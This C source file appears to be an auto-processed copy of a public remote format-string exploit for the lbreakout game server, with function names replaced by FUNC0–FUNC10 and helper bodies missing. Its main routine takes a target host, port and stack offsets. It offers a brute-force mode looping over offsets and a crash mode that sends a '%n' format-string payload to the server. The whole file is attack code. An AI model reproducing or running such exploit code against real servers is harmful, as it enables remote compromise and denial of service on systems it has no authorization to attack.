#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int EOF ; 
 int FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ) ; 
 int FUNC2 (int,char**,char*) ; 
 int /*<<< orphan*/  FUNC3 (char*,unsigned short) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC4 (char*,int) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int pt ; 
 int /*<<< orphan*/  FUNC6 (char*,unsigned short,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (char*,unsigned short,int,int,int) ; 
 scalar_t__ FUNC8 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 

int FUNC10(int argc,char **argv){
 unsigned short port=8000; /* default. */
 unsigned short getpop=0;
 unsigned short brute=0;
 unsigned short crash=0;
 int doffset=0;
 int roffset=0;
 int pops=0;
 int chr=0;
 char *hostname=0;
 while((chr=FUNC2(argc,argv,"t:h:p:d:r:P:gbc"))!=EOF){
  switch(chr){
   case 't':
    /* change this if more platforms are added. */
    if(FUNC0(optarg)<0||FUNC0(optarg)>1)
     FUNC9(argv[0]);
    pt=FUNC0(optarg);
    break;
   case 'h':
    if(!hostname&&!(hostname=(char *)FUNC8(optarg)))
     FUNC4("main(): allocating memory failed",1);
    break;
   case 'p':
    port=FUNC0(optarg);
    break;
   case 'd':
    doffset=(FUNC0(optarg)*4);
    break;
   case 'r':
    roffset=FUNC0(optarg);
    break;
   case 'P':
    pops=FUNC0(optarg);
    break;
   case 'g':
    getpop=1;
    break;
   case 'b':
    brute=1;
    break;
   case 'c':
    crash=1;
    break;
   default:
    FUNC9(argv[0]);
    break;
  }
 }
 if(!hostname)
  FUNC9(argv[0]);
 FUNC5(
 "[*] lbreakout[2-2.5+]: remote format string exploit"
 ".\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakeh"
 "alo)\n\n");
 if(getpop){
  FUNC3(hostname,port);
  FUNC1(0);
 }
 else if(crash){
  /* this can sometimes help to activate the code. */
  FUNC5("[*] sending server crash code.\n");
  /* login(name,pwd) buffer prefix, pwd is ignored. */
  FUNC6(hostname,port,"\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x03\x04%n",12,0);
 }
 else{
  if(brute){
   for(doffset=0;doffset<444;doffset+=4)
    FUNC7(hostname,port,doffset,roffset,pops);
   FUNC5("[!] brute force failed.\n");
  }
  else
   FUNC7(hostname,port,doffset,roffset,pops);
 }
 FUNC1(0);
}